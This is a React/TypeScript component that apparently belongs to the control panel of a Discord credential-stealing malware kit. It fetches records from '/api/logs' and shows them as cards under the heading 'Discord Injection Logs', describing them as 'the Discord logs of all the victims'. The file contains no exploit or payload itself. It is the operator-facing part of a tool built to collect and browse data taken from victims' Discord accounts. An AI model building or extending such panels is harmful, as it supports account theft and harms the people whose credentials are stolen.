import type { Build } from '@/interfaces';
import { AnimationContainer, BuildCardSkeleton, BuildCard } from '@/components';
import { fetcher } from '@/lib';
import { useId } from 'react';
import { CiStreamOn } from 'react-icons/ci';
import useSWR from 'swr';

export const Logs = () => {
  const { data, error } = useSWR('/api/logs', fetcher);
  const builds = data ? data : null;
  const id = useId();

  return (
    <>
      <div className="py-4 px-5">
        <div className="dark:bg-[#0a0a0a] bg-neutral-200 border dark:border-[#111] border-gray-300 rounded-lg px-4 py-3 flex items-center gap-3">
          <div className="flex items-center justify-center w-12 h-12 dark:bg-black bg-white px-3 py-3 dark:border-[#111] border-gray-300 rounded-xl">
            <CiStreamOn />
          </div>
          <div className="block">
            <h1 className="text-xl font-semibold">Discord Injection Logs</h1>
            <p className="text-gray-400">List of the Discord logs of all the victims!</p>
          </div>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-3 md:grid-cols-3 base:grid-cols-3 gap-[1rem] lg:!grid-cols-3 2xl:!grid-cols-3 !relative !overflow-hidden">
          {!builds || error ? (
            <>
              {Array.from({ length: 3 }).map(() => (
                <BuildCardSkeleton key={id} />
              ))}
            </>
          ) : (
            builds.map((data: Build) => (
              <AnimationContainer key={id}>
                <BuildCard {...data} />
              </AnimationContainer>
            ))
          )}
        </div>
      </div>
    </>
  );
};
